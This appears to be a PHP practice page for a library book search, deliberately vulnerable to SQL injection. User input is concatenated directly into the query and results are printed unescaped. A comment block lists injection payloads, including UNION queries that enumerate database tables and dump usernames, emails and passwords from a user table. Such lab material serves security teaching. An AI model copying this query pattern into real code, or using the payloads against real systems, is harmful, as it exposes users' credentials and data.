<?php require("db.php")?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Library explorer</title>
</head>
<body>
    <div>
        <div>
        <h1>Library</h1>
        </div>
        <form action="" method="GET">
            <div>
                <p>Search a book name...</p>
                <input type="text" name="name">
            </div>
            <div>
                <input type="submit" value="Search">
            </div>
        </form>
    </div>
    
    <div>
        <?php 
        //TESTS 
        // '; --
        // ' and 1 = sleep(2); --
        // ' union (select 1,2,3,4,5 from dual); --
        // ' union (select table_name, table_schema, 1, 2, 3 from information_schema.tables); --
        // ' union (select column_name, 2, 3, 4, 5 from information_schema.columns where table_name= 'user'); --
        // ' union (select firstname, lastname, email, password, type from user); --
        if (isset($_GET["name"])){
                $sql = "select b.title, b.releasedate, b.cover , a.firstname, a.lastname from book b inner join author a on a.id = b.author where title like '%". $_GET["name"] ."%';";
                echo $sql;
                $res = $pdo->query($sql);
                $books = $res->fetchAll();
                foreach ($books as $book) {
                    ?>
                    <div>
                        <?php echo $book["title"] . " | " . $book["firstname"] . " " . $book["lastname"] . " | " . $book["releasedate"] . " | " . $book["cover"]  ?>
                    </div>
                    <?php
                }
            }
        ?>
        
    </div>
</body>
</html>